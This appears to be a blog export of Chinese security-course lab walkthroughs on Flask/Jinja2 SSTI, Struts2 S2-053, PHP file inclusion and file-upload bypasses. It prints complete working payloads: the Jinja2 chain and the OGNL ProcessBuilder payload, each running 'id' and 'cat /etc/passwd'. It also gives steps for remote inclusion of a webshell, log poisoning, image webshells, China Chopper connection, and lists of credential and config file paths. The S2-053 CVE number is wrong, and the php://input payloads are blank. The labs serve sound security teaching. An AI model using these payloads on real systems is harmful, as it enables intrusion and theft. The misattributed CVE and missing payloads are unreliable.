Flask（Jinja2）服务端模板注入（SSTI）漏洞实验目的通过本实验，掌握服务端模板注入（SSTI）漏洞原理和利用方法，利用命令执行漏洞获取敏感信息。 实验环境 操作机：Win10用户名：Administrator密码：Sangfor!7890 靶机：Ubuntu + docker用户名：root密码：Sangfor!7890 实验地址：http:&#x2F;&#x2F;靶机ip:8000?name&#x3D;54289 实验原理注入类型的漏洞，常见Web注入有：SQL注入，XSS注入，XPATH注入，XML注入，代码注入，命令注入等等。注入漏洞的实质是服务端接受了用户的输入，未过滤或过滤不严谨执行了拼接了用户输入的代码，因此造成了各类注入。而服务端模板注入和常见Web注入的成因一样，也是服务端接收了用户的输入，将其作为Web应用模板内容的一部分，在进行目标编译渲染的过程中，执行了用户插入的恶意内容，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。Flask是一个使用Python编写的轻量级Web应用框架。其WSGI工具箱采用Werkzeug，模板引擎则使用Jinja2。 实验步骤第一步 启动目标靶机的环境1、登陆”Flask”靶机，执行如下命令，进入目标环境所在目录 123cd /vulhub-mastercd flaskcd ssti 2、执行以下命令，运行目标靶机的环境 1docker-compose up -d 3、登陆“Attack”操作机，打开浏览器，访问http:&#x2F;&#x2F;靶机ip:8000，看到Hello页面，说明靶机环境启动成功 第二步 漏洞复现4、通过“Attack”操作机的浏览器访问http:&#x2F;&#x2F;靶机ip:8000?name&#x3D;54289，得到54289，说明SSTI漏洞存在 5、将name参数的值更换为如下代码（获取eval函数并执行任意python代码的POC），执行命令成功 1234567891011&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125; &#123;% for b in c.__init__.__globals__.values() %&#125; &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125; &#123;% if &#x27;eval&#x27; in b.keys() %&#125; &#123;&#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#x27;) &#125;&#125; &#123;% endif %&#125; &#123;% endif %&#125; &#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125; 6、将上一步所用POC代码中的“id”处修改为“cat &#x2F;etc&#x2F;passwd”，即： 1234567891011&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125; &#123;% for b in c.__init__.__globals__.values() %&#125; &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125; &#123;% if &#x27;eval&#x27; in b.keys() %&#125; &#123;&#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;cat /etc/passwd&quot;).read()&#x27;) &#125;&#125; &#123;% endif %&#125; &#123;% endif %&#125; &#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125; 实验总结通过本实验，通过复现Flask（Jinja2）服务端模板注入（SSTI）漏洞，了解模板注入涉及的是服务端Web应用使用模板引擎渲染用户请求的过程，服务器模板中拼接了恶意用户输入导致各种漏洞。 S2-053远程代码执行漏洞实验目的通过本实验，掌握S2-053远程代码执行漏洞的攻击方法和防御措施。 实验环境 操作机：Win10用户名：Administrator密码：Sangfor!7890 靶机：Ubuntu + docker用户名：root密码：Sangfor!7890 实验地址：http:&#x2F;&#x2F;靶机ip:8080&#x2F;hello.action 实验原理继S2-052之后，Apache Struts 2再次被曝存在远程代码执行漏洞，漏洞编号S2-053，CVE编号CVE-2017-1000112。影响版本:Struts 2.0.1、Struts 2.3.33、Struts 2.5 – Struts 2.5.10当开发者在Freemarker标签中使用如下代码时，Freemarker会将值当作表达式进行执行（Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次后变成一个表达式，被OGNL解析第二次），最后导致远程代码执行。 实验步骤第一步 启动目标靶机的环境1、登陆”S2-053”靶机，执行如下命令，进入目标环境所在目录 123cd /vulhub-mastercd struts2cd s2-053 2、执行以下命令，运行目标靶机的环境 1docker-compose up -d 3、登陆“Attack”操作机，打开浏览器，访问http:&#x2F;&#x2F;靶机ip:8080，看到页面正显示，说明靶机环境启动成功 第二步 漏洞复现4、通过“Attack”操作机的浏览器访问http:&#x2F;&#x2F;靶机ip:8080&#x2F;hello.action，可以看到一个提交页面 5、在此页面下输入payload即可执行命令 1%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#x27;id&#x27;).(#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))&#125; 6、将上一步所用POC代码中的“id”处修改为“cat &#x2F;etc&#x2F;passwd”，即： 1%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#x27;cat /etc/passwd&#x27;).(#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))&#125; 注意：上述Payload末尾的换行不能少（也就是说payload后面必须跟一个换行） 实验总结通过本实验，成功实现了命令执行，通过该漏洞可以执行系统命令，加深对Struts2框架的利用和防御。","tags":["sxf","Red"],"categories":["Experiments"]},{"title":"某厂产业教育 - 文件包含漏洞原理与验证","path":"/2024/09/13/红蓝攻防/ⅦR文件包含漏洞原理与验证/","content":"文件包含分类实验目的通过本实验，掌握PHP文件包含的分类。 实验环境 操作机：Win10用户名：Administrator密码：Sangfor!7890 靶机：Apache + PHP 实验地址：http://ip/include/02/1.php 实验原理文件包含漏洞可以分为LFI（Local File Inclusion，本地文件包含）和RFI（Remote FileInclusion，远程文件包含）两种。而区分二者最简单的办法就是通过查看php.ini中是否开启了allow_url_include。如果开启就有可能包含远程文件。远程文件包含需要php.ini中allow_url_include&#x3D;on，allow_url_fopen &#x3D; On。在php.ini中，allow_url_fopen默认一直是On，而allow_url_include从php5.2之后就默认为Off。 实验步骤本地包含1、登录操作机，打开浏览器，在浏览器中访问http://ip/include/02/1.php?a=hello.txt，包含服务器本地当前目录下的文件 2、在浏览器中访问http://ip/include/02/1.php?a=…/include.php，包含服务器本地上一级目录的文件 3、在浏览器中访问http://ip/include/02/1.php?a=…/01/1.jpg，包含服务器本地其他目录的文件，进行目录遍历 远程包含1、打开”phpStudy”，启动操作机的Apache服务 2、在操作机的Web根目录下新建include.php 3、在浏览器中访问http:&#x2F;&#x2F;靶机ip&#x2F;include&#x2F;02&#x2F;1.php?a&#x3D;http:&#x2F;&#x2F;操作机ip&#x2F;include.php 实验总结通过本实验，掌握文件包含的分类。文件包含分为包含和远程包含。本地包含是包含目标服务器本地的文件，可以包含同目录下的文件：?file&#x3D;test.txt；也可以进行目录遍历来读取文件：?file&#x3D;.&#x2F;…&#x2F;…&#x2F;test.txt。其中.&#x2F;是当前目录，…&#x2F;是上一级目录。远程包含是包含远程服务器上的文件，?file&#x3D;http://www.test.com/shell.txt（常见的有三种，http、https、ftp）。 文件包含漏洞利用之读取敏感文件信息实验目的通过本实验，利用PHP文件包含漏洞读取敏感文件信息。 实验环境 操作机：Win10用户名：Administrator密码：Sangfor!7890 靶机：Apache + PHP 实验地址：http://ip/include/include.php 实验原理利用文件包含漏洞可以包含一些操作系统的敏感文件，从而读取重要信息。Windows系统敏感信息： 123456C:\\boot.ini //查看系统版本C:\\windows\\system32\\inetsrv\\MetaBase.xml //IIS配置文件C:\\windows\\repair\\sam //windows初次安装的密码C:\\program Files\\mysql\\my.ini //Mysql配置信息C:\\program Files\\mysql\\data\\mysql\\user.MYD //Mysql root C:\\windows\\php.ini //php配置信息...... Linux系统敏感信息： 123456/etc/passwd //linux用户信息/usr/local/app/apache2/conf/httpd.conf //apache2配置文件/usr/local/app/php5/lib/php.ini //php配置文件/etc/httpd/conf/httpd.conf //apache配置文件/etc/my.cnf //Mysql配置文件...... 实验步骤1、登录操作机，打开浏览器，在浏览器中访问http://ip/include/include.php 2、在浏览器中访问http://ip/include/include.php?page=xxx.php，包含不存在的文件，使其报错，获取服务器的Web根目录、当前网页的路径、Web服务器等信息 3、在浏览器中访问http://ip/include/include.php?page=C:\\server\\apache22\\conf\\httpd.conf，包含Apache配置文件获取信息 4、在浏览器中访问http://ip/include/include.php?page=C:\\server\\apache22\\logs\\access.log，包含Apache的访问日志获取信息 5、在浏览器中访问http://ip/include/include.php?page=C:\\server\\apache22\\logs\\error.log，包含Apache的错误日志获取信息 6、在浏览器中访问http://ip/include/include.php?page=C:\\Windows\\system32\\drivers\\etc\\hosts，包含hosts文件获取信息 7、在浏览器中访问http://ip/include/include.php?page=C:\\Windows\\win.ini，包含Windows系统的基本系统配置文件获取信息 实验总结通过本实验，掌握利用文件包含可以获取很多敏感信息，包含不存在的文件可以获取Web服务器、Web根目录、网站路径以及服务器的操作系统信息，根据Web服务器和Web根目录可以获取Apache的配置文件信息和日志文件信息，同时在知道服务器的操作系统后，也可以包含一些操作系统的敏感文件获取相关信息。利用文件包含获取敏感文件就是需要尽可能多的收集敏感文件的路径。 文件包含漏洞利用之本地包含配合文件上传包含图片马实验目的通过本实验，通过文件上传漏洞上传图片马，图片马不能解析，利用PHP文件包含漏洞解析图片马。 实验环境 操作机：Win10用户名：Administrator密码：Sangfor!7890 靶机：Apache + PHP 实验地址：http://ip/include/include.php 实验原理文件上传漏洞在绕过内容检测的时候，会制作图片马上传，但是图片马在上传之后，又不能解析。如果网站同时存在文件包含漏洞，利用文件包含无视后缀名，只要被包含的文件内容符合PHP语法规范，任何扩展名都可以被PHP解析的特点来解析上传的图片马。制作图片马的方式有很多，常见的有两种： 在图片后写入脚本代码 在cmd中使用命令 copy 1.jpg&#x2F;b+1.php&#x2F;a 2.jpg 12参数/b指定以二进制格式复制、合并文件，用于图像类/声音类文件参数/a指定以ASCII格式复制、合并文件，用于txt等文档类文件 实验步骤1、在操作机上准备要上传的文件（脚本文件），比如新建1.php文件 2、再准备一张正常的图片（网上下载就可以），打开cmd命令框，制作图片马 3、登录操作机，打开浏览器，在浏览器中访问http://ip/up/up.html 4、点击“选择文件”按钮，选中制作好的图片木马文件 5、点击“submit”按钮，上传图片马文件，脚本文件成功上传 6、访问http://ip/up/upload/info.jpg，上传的脚本文件不能解析，因为图片马需要配合文件包含漏洞或者解析漏洞 7、访问http://ip/include/include.php?page=../up/upload/info.jpg，包含图片马，图片马成功解析 实验总结通过本实验，掌握文件上传+文件包含的组合漏洞，在绕过上传的检测时可以制作图片马上传，图片马上传成功不能直接解析，可以利用文件包含的特点进行解析图片马。 文件包含漏洞利用之远程包含Webshell实验目的通过本实验，通过远程文件包含漏洞包含远程Webshell，从而Getshell。 实验环境 操作机：Win10用户名：Administrator密码：Sangfor!7890 靶机：Apache + PHP 实验地址：http://ip/include/include.php 实验原理本地包含只能包含目标服务器本地已有的文件，若目标服务器本地不存在木马文件，则无法利用。因此可以借助远程文件包含漏洞，在操作机本地搭建Web服务器，远程包含木马文件Getshell。 实验步骤1、登录操作机，打开浏览器，在浏览器中访问http://ip/include/include.php 2、打开”phpStudy”，启动操作机的Apache服务 3、在操作机的Web根目录下新建shell.txt文件 4、在浏览器中访问http:&#x2F;&#x2F;目标机ip&#x2F;include.php?page&#x3D;http:&#x2F;&#x2F;操作机ip&#x2F;shell.txt，并发送post数据测试一句话木马可以解析 5、打开桌面tools文件夹的“中国菜刀（过狗）”，双击exe文件 6、在空白处鼠标右击，点击“添加”，添加shell地址 地址为：一句话木马地址和连接密码 脚本类型：PHP 7、点击“添加”，双击一句话木马地址 实验总结通过本实验，掌握在无其他漏洞，只有文件包含漏洞，且目标服务器本地无shell文件可利用，又可以远程文件包含时，可以在攻击机本地新建一个一句话木马文件（比如：shell.txt，不要以.php的文件存在，因为php文件在操作机本地会被解析），然后远程包含攻击机本地新建的木马文件，从而Getshell。 文件包含漏洞利用之包含Apache日志文件Getshell实验目的通过本实验，访问目标网站，在Apache的访问日志中产生记录，利用文件包含漏洞包含日志文件，从而Getshell。 实验环境 操作机：Win10用户名：Administrator密码：Sangfor!7890 靶机：Apache + PHP 实验地址：http://ip/include/include.php 实验原理Apache有两个日志文件：访问日志文件access.log和错误日志文件error.log。在请求访问网站时，web服务器会将请求写入到日志文件中。比如说Apache服务器，在用户发起请求时，会将请求写入access.log，当发生错误时将错误写入error.log。当网站只存在文件包含漏洞，但是无Webshell文件可以包含时，也没有上传漏洞，可以发送请求，记录到日志文件中，再包含日志文件Getshell。日志默认路径： 12345678910111213141516171819Apache：Apache + Linux日志默认路径/etc/httpd/logs/access_log 或 /var/log/httpd/access logApache + Windows日志默认路径XAMPP套件：xampp\\apache\\logs/access.logphpStudy套件：phpStudy\\Apache\\logs/access.logIIS：IIS6 默认日志文件位置 C:WINDOWS\\system32\\LogfilesIIS7 默认日志文件位置 %SystemDrive%\\inetpub\\logs\\LogFilesNginx：nginx日志文件在用户安装目录的logs目录下如安装目录为/usr/local/nginx，则日志目录就是在/usr/local/nginx/logs里也可通过其配置文件nginx.conf，获取到日志的存在路径（/opt/nginx/logs/access.log） 实验步骤1、登录操作机，打开浏览器，在浏览器中访问http://ip/include/include.php 2、访问http://ip/include/include.php?page=xxx.php，包含不存在的文件，使其报错，获取服务器的Web根目录、当前网页的路径、Web服务器等信息，猜测Web服务器的日志文件 3、访问http://ip/include/include.php?page=C:\\server\\apache22\\logs\\access.log，包含Apache访问日志文件，成功找到Apache访问日志文件 4、访问http://ip/include/，将请求记录到Apache访问日志中 5、访问http://ip/include/include.php?page=C:\\server\\apache22\\logs\\access.log，包含Apache日志文件，日志文件记录成功，但是没有解析成功 6、打开桌面的的“Burp”文件夹，双击“BURP.cmd”启动Burp Suite抓包工具 7、切换到“Proxy”代理模块的“Options”，查看Bp的代理 8、切换到浏览器，选择火狐插件中的代理（配置浏览器的的代理），与Bp的代理一致 9、访问http://ip/include/，Bp成功抓取数据包 10、将数据包中的编码格式去掉，将其变成正常的脚本代码 11、点击“Forward”，转发数据包，切换到浏览器，将请求中的代码再次添加到Apache访问日志记录中 12、关闭浏览器代理 13、访问http://ip/include/include.php?page=C:\\server\\apache22\\logs\\access.log，包含Apache日志文件，解析成功 实验总结通过本实验，掌握在无其他漏洞，只有文件包含漏洞，且目标服务器本地既无shell文件可利用，也没有远程文件包含时，可以在请求中添加脚本代码和一句话木马代码，再利用Burp Suite抓包将数据包中的编码去掉，再包含日志文件，从而Getshell。 PHP封装伪协议之php流input实验目的通过本实验，通过文件包含漏洞，利用PHP封装伪协议，发送POST数据进行命令执行。 实验环境 操作机：Win10用户名：Administrator密码：Sangfor!7890 靶机：Apache + PHP 实验地址：http://ip/include/include.php 实验原理PHP有很多内置URL风格的封装协议,这类协议与fopen()，copy()，file_exists()，filesize()等文件系统函数所提供的功能类似。这类协议有：利用php流input中流的概念，将原来的文件流重定向到了用户可控的输入流中执行命令。 实验步骤1、登录操作机，打开浏览器，在浏览器中访问http://ip/include/include.php 2、访问http://ip/include/include.php?page=php://input 3、勾选”Post data”，在提交post数据的位置输入”“，并发送数据执行 4、发送”“数据执行系统命令 5、发送”“数据执行系统命令 6、发送”","tags":["sxf","Red"],"categories":["Experiments"]},{"title":"某厂产业教育 - 文件上传漏洞原理与验证","path":"/2024/09/13/红蓝攻防/ⅨR文件上传漏洞原理与验证/","content":"获取上传文件信息实验目的通过本实验，理解文件上传过程中上传文件的信息，为熟练掌握文件上传的过滤和绕过方法奠定基础。 实验环境 操作机：Win10用户名：Administrator密码：Sangfor!7890 靶机：Apache + PHP 实验地址：http://ip/up/1/up.html 实验原理处理文件上传功能时，会利用表单中的文件上传域，定义表单时必须设置enctype&#x3D;”multipart&#x2F;form-data”参数。在上传文件后，可以使用$_FILES[‘upfile’]访问文件的有关信息。上传文件的相关信息： 12345$_FILES[&#x27;upfile&#x27;][&#x27;name&#x27;]; //客户端上传文件的原名称，不包含路径$_FILES[&#x27;upfile&#x27;][&#x27;type&#x27;]; //上传文件的MIME类型 $_FILES[&#x27;upfile&#x27;][&#x27;tmp_name&#x27;]; //已上传文件在服务器端保存的临时文件名，包含路径$_FILES[&#x27;upfile&#x27;][&#x27;error&#x27;]; //上传文件出现的错误号，为一个整数$_FILES[&#x27;upfile&#x27;][&#x27;size&#x27;]; //已上传文件的大小，单位为字节 实验步骤1、登录操作机，打开“Google Chrome”浏览器，输入实验地址：http://ip/up/1/up.html 2、在操作机上准备要上传的文件（任意文件都可以），比如新建info.php文件 3、点击“选择文件”按钮，选中要上传的文件 4、点击“submit”按钮，查看上传文件信息 实验总结掌握文件上传的过程以及上传文件的信息 文件上传漏洞利用实验目的通过本实验，掌握文件上传的过程以及文件上传漏洞的利用，理解文件上传的利用条件和漏洞危害。 实验环境 操作机：Win10用户名：Administrator密码：Sangfor!7890 靶机：Apache + PHP 实验地址：http://ip/up/2/up.html 实验原理上传文件时，如果未对上传的文件进行严格的验证和过滤，就容易造成文件上传漏洞，上传脚本文件（包括asp、aspx、jsp、php等）造成文件上传漏洞的成因（比较复杂）有： Web应用开放了文件上传功能，并且对上传的文件没有进行足够的限制 程序开发部署的时候，没有考虑到系统特性和过滤不严格 通过其他漏洞绕过限制 实验步骤1、登录操作机，打开浏览器，输入实验地址：http://ip/up/2/up.html 2、在操作机上准备要上传的文件（脚本文件），比如新建info.php文件 3、点击“选择文件”按钮，选中要上传的文件 4、点击“submit”按钮，上传info.php文件 5、输入http://ip/up/2/upload/info.php，访问上传的info.php脚本文件，查看脚本文件nfo.php文件可以成功上传并解析 6、在操作机上新建muma.php的一句话木马文件 7、上传一句话木马文件 8、打开桌面tools文件夹的“中国菜刀（过狗）”，双击exe文件 9、在空白处鼠标右击，点击“添加”，添加shell地址 地址为：一句话木马地址和连接密码 脚本类型：PHP 10、点击“添加”，双击一句话木马地址 11、浏览器服务器，对任意文件进行操作，可以上传、下载等，成功上传后门文件，服务器沦陷 思考1231、一句话木马由几个部分组成？2、一句话木马如何发送命令？3、一句话木马发送的命令如何执行？ 实验总结掌握文件上传的过程和文件上传漏洞的利用过程，利用文件上传漏洞上传木马脚本，通过WebShell工具连接后门，拿下网站服务器，理解文件上传的危害。 客户端检测与绕过之删除浏览器事件实验目的通过本实验，掌握文件上传客户端的检测原理以及绕过方法。 实验环境 操作机：Win10用户名：Administrator密码：Sangfor!7890 靶机：Apache + PHP 实验地址：http://ip/upfile/1/upload.html 实验原理文件上传的客户端检测主要通过前端的JS代码获取文件后缀名进行验证，后端PHP代码没有对文件做任何检测，因此只需要绕过客户端检测。客户端检测的绕过方法有三种： 1231. 删除浏览器事件2. 通过BurpSuite抓包修改后缀名3. 伪造上传表单 实验步骤1、登录操作机，打开浏览器，输入实验地址：http://ip/upfile/1/upload.html 2、在操作机上准备要上传的文件（脚本文件），比如新建info.php文件 3、点击“选择文件”按钮，选中要上传的文件 4、点击“submit”按钮，文件上传失败 5、根据提示，需要上传“jpg”的图片文件，点击“确定”返回上传页面，鼠标右击，点击“查看元素” 6、定位到文件域位置，可以看到表单调用了selectFile()函数 7、追溯到selectFile()函数，双击展开函数代码 8、从代码中可以分析出：表单调用JS代码的selectFile()函数，先获取上传文件的文件名，然后将文件名转换为小写，再通过substr函数截取文件后缀名（包括.）进行判断。所以只需要不调用该JS代码，删除浏览器事件，即onsubmit&#x3D;” “ 9、点击“submit”按钮，再次上传文件，脚本文件成功上传 10、访问http://ip/upfile/1/upload/info.php，上传的脚本文件成功解析 实验总结掌握文件上传的客户端检测原理以及通过删除浏览器事件，绕过JS代码的限制。 客户端检测与绕过之抓包修改后缀名实验目的通过本实验，掌握文件上传客户端的检测原理以及绕过方法。 实验环境 操作机：Win10用户名：Administrator密码：Sangfor!7890 靶机：Apache + PHP 实验地址：http://ip/upfile/1/upload.html 实验原理文件上传的客户端检测主要通过前端的JS代码获取文件后缀名进行验证，后端PHP代码没有对文件做任何检测，因此只需要绕过客户端检测。客户端检测的绕过方法有三种： 1231. 删除浏览器事件2. 通过Burp Suite抓包修改后缀名3. 伪造上传表单 实验步骤1、登录操作机，打开浏览器，输入实验地址：http://ip/upfile/1/upload.html 2、在操作机上准备要上传的文件（脚本文件），比如新建test.php文件 3、点击“选择文件”按钮，选中要上传的文件 4、点击“submit”按钮，文件上传失败 5、根据提示，需要上传“jpg”的图片文件，打开桌面的的“Burp”文件夹，双击“BURP.cmd”启动Burp Suite抓包工具 6、切换到“Proxy”代理模块的“Options”，查看Bp的代理 7、切换到浏览器，选择火狐插件中的代理（配置浏览器的的代理），与Bp的代理一致 8、客户端只能上传jpg文件，将脚本文件test.php更改后缀名为test.jpg，再选中文件 9、点击“submit”按钮，再次上传文件，Bp成功抓取数据包 10、将数据包中的后缀名再改为php，绕过客户端的检测 11、点击“Forward”，转发数据包，切换到浏览器，脚本文件成功上传 12、关闭浏览器代理 13、访问http://ip/upfile/1/upload/test.php，上传的脚本文件成功解析 实验总结掌握文件上传的客户端检测原理以及通过Burp Suite抓包工具抓取数据包，修改文件后缀名绕过JS代码的限制。 客户端检测与绕过之伪造上传表单实验目的通过本实验，掌握文件上传客户端的检测原理以及绕过方法。 实验环境 操作机：Win10用户名：Administrator密码：Sangfor!7890 靶机：Apache + PHP 实验地址：http://ip/upfile/1/upload.html 实验原理文件上传的客户端检测主要通过前端的JS代码获取文件后缀名进行验证，后端PHP代码没有对文件做任何检测，因此只需要绕过客户端检测。客户端检测的绕过方法有三种： 1231. 删除浏览器事件2. 通过Burp Suite抓包修改后缀名3. 伪造上传表单 实验步骤1、登录操作机，打开浏览器，输入实验地址：http://ip/upfile/1/upload.html 2、在操作机上准备要上传的文件（脚本文件），比如新建1.php文件 3、点击“选择文件”按钮，选中要上传的文件 4、点击“submit”按钮，文件上传失败 5、右击，点击“查看页面源代码” 6、可以看到表单调用了JS代码的selectFile()函数做过滤限制，并且表单提交到upload.php页面，所以伪造一个没有做任何过滤限制的表单同样提交到http://ip/upfile/1/upload.php即可，新建1.html文件 7、双击1.html文件 8、点击“浏览”，选择要上传的脚本文件1.php 9、点击“submit”按钮，再次上传文件，脚本文件成功上传 10、访问http://ip/upfile/1/upload/info.php，上传的脚本文件成功解析 实验总结掌握文件上传的客户端检测原理以及通过伪造一个没有做任何限制的表单，数据依然提交到http://ip/upfile/1/upload.php，绕过原来的JS代码的限制。 后缀名检测与绕过之大小写绕过实验目的通过本实验，掌握文件上传服务端检测中的后缀名的检测原理以及绕过方法。 实验环境 操作机：Win10用户名：Administrator密码：Sangfor!7890 靶机：Apache + PHP 实验地址：http://ip/upfile/2/upload1.html 实验原理文件上传从客户端进行检测显然是防护不足的，所以需要从服务器端进行防护。服务端的检测与绕过方法有很多，常见的有： 123451. 后缀名检测绕过2. MIME类型检测与绕过3. 文件内容检测与绕过4. 00截断绕过5. 条件竞争检测与绕过 后缀名检测的绕过方法也有很多，常见的有： 123456789101. 黑名单--大小写绕过2. 黑名单--名单列表绕过3. 黑名单--Windows特性（末尾的点【.】）绕过4. 黑名单--Windows特性（空格【 】）绕过5. 黑名单--Windows特性（::$DATA）绕过6. 白名单（需要结合文件包含漏洞或者Web服务器解析漏洞）7. .htaccess文件攻击--匹配文件内容8. .htaccess文件攻击--配皮文件名中的关键字9. .htaccess文件攻击--匹配文件名10. Apache解析漏洞 实验步骤1、登录操作机，打开浏览器，输入实验地址：http://ip/upfile/2/upload1.html 2、在操作机上准备要上传的文件（脚本文件），比如新建1.php文件 3、点击“选择文件”按钮，选中要上传的文件 4、点击“submit”按钮，文件上传失败，不允许的后缀名 5、尝试利用大小写绕过，将脚本文件1.php更改为1.pHp，再次选择脚本文件 6、点击“submit”按钮，上传文件，脚本文件成功上传 7、访问http://ip/upfile/2/upload/1.pHp，上传的脚本文件成功解析 实验总结掌握文件上传的服务端检测中的后缀名检测原理以及通过大小写的转换来绕过后缀名的检测。 后缀名检测与绕过之名单列表绕过实验目的通过本实验，掌握文件上传服务端检测中的后缀名的检测原理以及绕过方法。 实验环境 操作机：Win10用户名：Administrator密码：Sangfor!7890 靶机：Apache + PHP 实验地址：http://ip/upfile/2/upload2.html 实验原理文件上传从客户端进行检测显然是防护不足的，所以需要从服务器端进行防护。服务端的检测与绕过方法有很多，常见的有： 123451. 后缀名检测绕过2. MIME类型检测与绕过3. 文件内容检测与绕过4. 00截断绕过5. 条件竞争检测与绕过 后缀名检测的绕过方法也有很多，常见的有： 123456789101. 黑名单--大小写绕过2. 黑名单--名单列表绕过3. 黑名单--Windows特性（末尾的点【.】）绕过4. 黑名单--Windows特性（空格【 】）绕过5. 黑名单--Windows特性（::$DATA）绕过6. 白名单（需要结合文件包含漏洞或者Web服务器解析漏洞）7. .htaccess文件攻击--匹配文件内容8. .htaccess文件攻击--配皮文件名中的关键字9. .htaccess文件攻击--匹配文件名10. Apache解析漏洞 实验步骤1、登录操作机，打开浏览器，输入实验地址：http://ip/upfile/2/upload2.html 2、在操作机上准备要上传的文件（脚本文件），比如新建info.php文件 3、点击“选择文件”按钮，选中要上传的文件 4、点击“submit”按钮，文件上传失败，不允许的后缀名 5、尝试利用大小写绕过，将脚本文件info.php更改为info.pHp，再次选择脚本文件 6、点击“submit”按钮，上传文件，依然失败，不允许的后缀名 7、尝试寻找黑名单列表之外可允许上传的文件后缀名进行绕过，将脚本文件info.php更改为info.php3或者info.phtml，再次选择脚本文件 8、点击“submit”按钮，继续上传文件，脚本文件成功上传 9、访问http://ip/upfile/2/upload/info.php3，上传的脚本文件成功解析 实验总结掌握文件上传的服务端检测中的后缀名检测原理，通过尝试利用大小写绕过以及寻找黑名单列表之外可允许上传的文件后缀名进行绕过。 后缀名检测与绕过之Windows特性（末尾的点【.】）绕过实验目的通过本实验，掌握文件上传服务端检测中的后缀名的检测原理以及绕过方法。 实验环境 操作机：Win10用户名：Administrator密码：Sangfor!7890 靶机：Apache + PHP 实验地址：http://ip/upfile/2/upload3.html 实验原理文件上传从客户端进行检测显然是防护不足的，所以需要从服务器端进行防护。服务端的检测与绕过方法有很多，常见的有： 123451. 后缀名检测绕过2. MIME类型检测与绕过3. 文件内容检测与绕过4. 00截断绕过5. 条件竞争检测与绕过 后缀名检测的绕过方法也有很多，常见的有： 123456789101. 黑名单--大小写绕过2. 黑名单--名单列表绕过3. 黑名单--Windows特性（末尾的点【.】）绕过4. 黑名单--Windows特性（空格【 】）绕过5. 黑名单--Windows特性（::$DATA）绕过6. 白名单（需要结合文件包含漏洞或者Web服务器解析漏洞）7. .htaccess文件攻击--匹配文件内容8. .htaccess文件攻击--配皮文件名中的关键字9. .htaccess文件攻击--匹配文件名10. Apache解析漏洞 一些特殊的文件命名方式在Windows下是不被允许的，利用Burp Suite工具抓包修改后缀名，绕过服务端的验证后上传文件，Windows会自动去掉后面添加的。注：此方法只适应于Windows，因为Unix&#x2F;Linux系统没有这个特性。 实验步骤1、登录操作机，打开浏览器，输入实验地址：http://ip/upfile/2/upload3.html 2、在操作机上准备要上传的文件（脚本文件），比如新建info.php文件 3、点击“选择文件”按钮，选中要上传的文件 4、点击“submit”按钮，文件上传失败，此文件不允许上传 5、尝试利用大小写绕过，将脚本文件info.php更改为info.pHp，以及尝试寻找黑名单列表之外可允许上传的文件后缀名进行绕过，将脚本文件info.php更改为info.php3或者info.phtml，再次选择脚本文件上传，依然失败，此文件不允许上传 6、打开桌面的的“Burp”文件夹，双击“BURP.cmd”启动Burp Suite抓包工具 7、切换到“Proxy”代理模块的“Options”，查看Bp的代理 8、切换到浏览器，选择火狐插件中的代理（配置浏览器的的代理），与Bp的代理一致 9、点击“submit”按钮，再次上传文件，Bp成功抓取数据包 10、利用Windows特性，给文件名加“.”绕过服务端后缀名的检测，将数据包中的后缀名info.php改为info.php. 11、点击“Forward”，转发数据包，切换到浏览器，脚本文件成功上传 12、关闭浏览器代理 13、访问http://ip/upfile/2/upload/info.php.（访问http://ip/upfile/2/upload/info.php也可以），上传的脚本文件成功解析 实验总结掌握文件上传的服务端检测中的后缀名检测原理，“【.】”在Windows下是不被允许的，利用Burp Suite抓包在文件后缀名处添加“【.】”，绕过服务端的验证后上传文件，Windows会自动去掉后面添加的点（【.】）。 后缀名检测与绕过之Windows特性（空格【 】）绕过实验目的通过本实验，掌握文件上传服务端检测中的后缀名的检测原理以及绕过方法。 实验环境 操作机：Win10用户名：Administrator密码：Sangfor!7890 靶机：Apache + PHP 实验地址：http://ip/upfile/2/upload4.html 实验原理文件上传从客户端进行检测显然是防护不足的，所以需要从服务器端进行防护。服务端的检测与绕过方法有很多，常见的有： 123451. 